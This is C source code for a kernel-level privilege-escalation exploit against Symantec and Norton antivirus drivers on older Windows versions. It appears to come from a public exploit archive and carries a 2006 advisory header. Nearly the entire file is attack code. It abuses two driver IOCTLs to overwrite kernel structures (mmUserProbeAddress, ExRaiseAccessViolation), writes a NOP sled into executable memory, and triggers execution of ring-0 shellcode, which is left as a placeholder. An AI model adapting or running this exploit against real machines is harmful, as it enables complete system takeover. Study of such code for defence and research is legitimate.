// source: http://www.securityfocus.com/bid/20360/info
 
// Symantec AntiVirus is prone to a privilege-escalation vulnerability.
 
// Local attackers can exploit this issue to corrupt memory and execute arbitrary code with kernel-level privileges. Successful exploits may facilitate a complete system compromise.
 
// This issue affects only Symantec and Norton antivirus products running on Microsoft Windows NT, Windows 2000, and Windows XP.

/////////////////////////////////////////////
///// Norton Internet Security          /////
/////////////////////////////////////////////
//// For educational purposes ONLY
/////////////////////////////////////////////
//// Ring0 xploit
//// Rub�n Santamarta 
//// www.reversemode.com
//// 26/08/2006
////////////////////////////////////



#include <windows.h>
#include <stdio.h>



#define WXP_USERPROBE 0x87E34
#define W2K_USERPROBE 0x81B1C

#define WXP_EXCEPTION 0x16F120
#define W2K_EXCEPTION 0x944b6

typedef BOOL (WINAPI *PENUMDEVICES)(LPVOID*,
									DWORD ,
									LPDWORD);

typedef DWORD (WINAPI *PGETDEVNAME)(LPVOID ImageBase,
									LPTSTR lpBaseName,
									DWORD nSize);
									
									
DWORD CalcJump(DWORD BaseNt,BOOL InXP,DWORD *hValue,DWORD *ShellAddr)
{

      DWORD SumTemp,IniAddress,i,sumAux,addTemp,OffWord;
	  
	  if(InXP)
	  {
		SumTemp=BaseNt+WXP_EXCEPTION+0xE;
	    OffWord=0x64B8;
	  }
	  else
	  {
	    SumTemp=BaseNt+W2K_EXCEPTION+0xE;
		OffWord=0x5358;
	  }

  
	  for(i=0x4c;i<0xDDDC;i=i+4)
	  {   
		sumAux=~((i*0x10000)+OffWord);
		addTemp=SumTemp-sumAux;
		if(addTemp>0xE000000 && addTemp<0xF000000){
				IniAddress=addTemp&0xFFFFF000;
				*hValue=i-4;
				*ShellAddr=addTemp;
				break;
		}
	  }
	  printf("\nINFORMATION \n");
	  printf("-----------------------------------------------------\n");
      printf("Patched ExRaiseAccessViolation pointing to \t [0x%p]\n",addTemp-1);
      printf("0xF000h bytes allocated  at \t\t [0x%p]\n",IniAddress);
      printf("Magic Value\t\t\t	 [0x%p]\n\n",i-4);
	  
      return (IniAddress);
} 
									
VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}

int main(int argc, char *argv[])
{

 DWORD				*OutBuff,*InBuff,Ring0Addr,mmUserProbe;			
 DWORD				dwIOCTL,OutSize,InSize,junk,cb,devNum,i,ShellAddr,hValue;
 HANDLE				hDevice;
 PENUMDEVICES pEnumDeviceDrivers;
 PGETDEVNAME  pGetDeviceDriverBaseName;
 LPVOID arrMods[200],addEx;
 DWORD BaseNt=0,BaseAuxNt;
 BOOL InXP;
 CHAR baseName[MAX_PATH];
 unsigned char Ring0ShellCode[]="\xcc";       //"PUT YOUR RING0 CODE HERE "
 
  system("cls");
 
  printf("\n################################\n");
  printf("## Norton I.S                 ##\n");
  printf("## Ring0 Exploit              ##\n");
  printf("################################\n");
  printf("\nRuben Santamarta\nwww.reversemode.com\n\n");
 
 if(argc<2)
 {
  
 
  printf("\nusage> exploit.exe <XP> or <2K>\n");
  exit(1);
 }
 

 pEnumDeviceDrivers=(PENUMDEVICES)GetProcAddress(LoadLibrary("psapi.dll"),
												 "EnumDeviceDrivers");

 pGetDeviceDriverBaseName=(PGETDEVNAME)GetProcAddress(LoadLibrary("psapi.dll"),
												 "GetDeviceDriverBaseNameA");

 pEnumDeviceDrivers(arrMods,sizeof(arrMods),&cb);
 devNum=cb/sizeof(LPVOID);
 printf("\n[!] Searching Ntoskrnl.exe Base Address...");

 for(i=0;i<=devNum;i++)
 {
       pGetDeviceDriverBaseName(arrMods[i],baseName,MAX_PATH);
	   if((strncmp(baseName,"ntoskr",6)==0))
	   {
	  	   printf("[%x] Found!\n",arrMods[i]);
		   BaseNt = (DWORD)arrMods[i];
		   BaseAuxNt=BaseNt;
	   }
 }
 
if (!BaseNt) 
{
   printf("!!? ntoskrnl.exe base address not found\nexiting\n\n");
   exit(0);
}

  if(strncmp(argv[1],"XP",2)==0) InXP = TRUE;
  else                           InXP = FALSE;



////////////////////////////////////// 
//////  STAGE 1
//////////////////////////////////////

if(InXP)    BaseNt += WXP_USERPROBE;
else      BaseNt += W2K_USERPROBE;

 
 //////////////////////
///// CASE 'DosDevice'
//////////////////////

hDevice = CreateFile("\\\\.\\NAVENG",
                     0,
                     0,
                     NULL,
                     3,
                     0,
                     0);
 
 if (hDevice == INVALID_HANDLE_VALUE) ShowError();
 printf("\n\n** Initializing Exploit\t[Stage 1]\n\n");
 printf("\nINFORMATION \n");
  printf("-----------------------------------------------------\n");
 printf("[!] NAVENG Device Handle [%x]\n",hDevice);
 
//////////////////////
///// BUFFERS
//////////////////////
 OutSize = 4;
 OutBuff = malloc(sizeof(DWORD));
 
 //////////////////////
 ///// IOCTL
 //////////////////////

 dwIOCTL = 0x222ADB;

 DeviceIoControl(hDevice, 
                 dwIOCTL, 
                 (LPVOID)0,0,
                 (LPVOID)OutBuff,OutSize,
                 &junk,  
                 NULL);
                 
 printf("[!] mmUserProbeAddress current value:\t[0x7FFF0000]\n");        
 printf("[!] Overwriting mmUserProbeAddress at:\t[0x%x] \n",BaseNt);
 printf("[!] mmUserProbeAddress current value:\t[0x%x]\n",OutBuff[0]);
 printf("[*] ProbeForWrite now checking for values greater than 0x%x\n\n",OutBuff[0]);
                
 DeviceIoControl(hDevice, 
                 dwIOCTL, 
                 (LPVOID)0,0,
                 (LPVOID)BaseNt,OutSize,
                 &junk,  
                 NULL);
 mmUserProbe=OutBuff[0];
 free((LPVOID)OutBuff);
 CloseHandle(hDevice);


//////////////////////
///// STAGE 2
//////////////////////

 BaseNt = BaseAuxNt;
 /////////////////////////
 printf("\n\n** Initializing Exploit\t[Stage 2]\n\n");
 
 addEx=(LPVOID)CalcJump(BaseNt,InXP,&hValue,&ShellAddr);
 OutBuff=(DWORD*)VirtualAlloc((LPVOID)addEx,0xF000,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
 
 if(!OutBuff) ShowError();
 

 InBuff=OutBuff;
 
 printf("[!] Checking Shadow Device...");
 hDevice = CreateFile("\\\\.\\shadow",
                    GENERIC_READ|GENERIC_WRITE,
                    0,
                    0,
                    OPEN_EXISTING,
                    0,
                    NULL);
  
 if (hDevice == INVALID_HANDLE_VALUE) ShowError();
 printf("[OK]\n");
 
 printf("[!] Exploiting Shadow Device...\n");

 while(OutBuff[3]< hValue)
  {
			DeviceIoControl(hDevice,      // "\\.\shadow"
                            0x141043,  // Privileged IOCTL
                            InBuff, 2,    // InBuffer, InBufferSize
                            OutBuff, 0x18,// OutBuffer,OutBufferSize
                            &junk,        // bytes returned
                            (LPOVERLAPPED) NULL);
  
  printf("\r\t[->]VALUES: (%x)",OutBuff[3]);
  }

  if(InXP)  Ring0Addr = BaseNt + WXP_EXCEPTION;
  else  	Ring0Addr = BaseNt + W2K_EXCEPTION; 
  
  printf("\n[!] Overwriting ExRaiseAccessViolation at [0x%x]...",Ring0Addr+0xC);
  DeviceIoControl(hDevice,      // "\\.\shadow"
                            0x141043,  // Privileged IOCTL
                            InBuff, 2,    // InBuffer, InBufferSize
                            (LPVOID)Ring0Addr, 0x18,// OutBuffer,OutBufferSize 0x
                            &junk,        // bytes returned
                            (LPOVERLAPPED) NULL);
   
 
   printf("[OK]");
   printf("\n\n\t\t[!] Initializing Countdown,last chance to abort.");
   
   for(i=1;i<0x3C00;i++) OutBuff[i]=0x90909090; // paged out
   memcpy((LPVOID)ShellAddr,(LPVOID)Ring0ShellCode,sizeof(Ring0ShellCode));
   
   for(i=10;i>=1;i--)
   {
    printf("\r -[ %d ]- ",i);
    if(i==1) printf("\n\n[*] Executing ShellCode");
    Sleep(1000);
   }
  
   DeviceIoControl(hDevice,      
                   0x141043,  
                   InBuff, 2,   
                   (LPVOID)mmUserProbe+0x1000, 0x18,
                   &junk,       
                   (LPOVERLAPPED) NULL);
   
   
   CloseHandle(hDevice);
   
   printf("\n\n[*] Exploit terminated\n\n");


 /////////////////////
 ///// CLeanUp
 /////////////////////

   free(OutBuff);
   
   return 0;
}